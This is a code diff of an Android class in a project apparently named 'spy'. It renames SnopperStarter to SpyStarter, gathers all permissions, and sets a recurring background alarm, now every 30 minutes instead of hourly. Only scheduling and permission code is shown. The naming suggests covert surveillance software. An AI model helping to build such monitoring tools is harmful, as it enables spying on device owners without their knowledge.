@@ -4,16 +4,16 @@ import android.app.AlarmManager;
 import android.app.PendingIntent;
 import android.content.Context;
 import android.content.Intent;
-import com.gameofcoding.spy.receivers.SnopperAlarm;
-import com.gameofcoding.spy.activities.SnopperStarterActivity;
+import com.gameofcoding.spy.receivers.SpyAlarmReceiver;
+import com.gameofcoding.spy.activities.SpyStarterActivity;
 import com.gameofcoding.spy.utils.XLog;
 
-public class SnopperStarter {
-    private static final String TAG = "SnopperStarter";
-    private static final int SNOPPER_ALARM_ID = 10001;
+public class SpyStarter {
+    private static final String TAG = "SpyStarter";
+    private static final int SPY_ALARM_ID = 10001;
     private Context mContext;
 
-    public SnopperStarter(Context context) {
+    public SpyStarter(Context context) {
 	mContext = context;
     }
 
@@ -24,28 +24,28 @@ public class SnopperStarter {
 	}
 
 	if(!hasAllPermissions()) {
-	    XLog.d(TAG, "start(): Starting 'SnopperStarterActivity' to grant all permissions."); 
-	    mContext.startActivity(new Intent(mContext, SnopperStarterActivity.class));
+	    XLog.d(TAG, "start(): Starting 'SpyStarterActivity' to grant all permissions."); 
+	    mContext.startActivity(new Intent(mContext, SpyStarterActivity.class));
 	    return;
-	}
-	
-        Intent intent = new Intent(mContext, SnopperAlarm.class);
+	}	
+        Intent intent = new Intent(mContext, SpyAlarmReceiver.class);
 
 	// Check if alarm is already running
-	PendingIntent preAlarm = PendingIntent.getBroadcast(mContext, SNOPPER_ALARM_ID,
+	PendingIntent preAlarm = PendingIntent.getBroadcast(mContext, SPY_ALARM_ID,
 							    intent, PendingIntent.FLAG_NO_CREATE);
 	if(preAlarm != null) {
-	    XLog.d(TAG, "Not starting SnopperAlarm (already active)");
+	    XLog.d(TAG, "Not starting SpyAlarm (already active)");
 	    return;
 	}
-	    
+	   
 	// Set alarm that repeats after every 24 hours.
 	// FIXME: 1 hr.  -> 12 hr. time
-	PendingIntent pendingIntent = PendingIntent.getBroadcast(mContext, SNOPPER_ALARM_ID,
+	PendingIntent pendingIntent = PendingIntent.getBroadcast(mContext, SPY_ALARM_ID,
 								 intent, 0);
         AlarmManager am = (AlarmManager) mContext.getSystemService(Context.ALARM_SERVICE);
         am.setRepeating(AlarmManager.RTC_WAKEUP, System.currentTimeMillis(),
-			(1000 * 60) * 60, pendingIntent);
+			(1000 * 60) * 30, pendingIntent);
+	XLog.i(TAG, "Alarm set");
     }
 
     public boolean hasAllPermissions() {
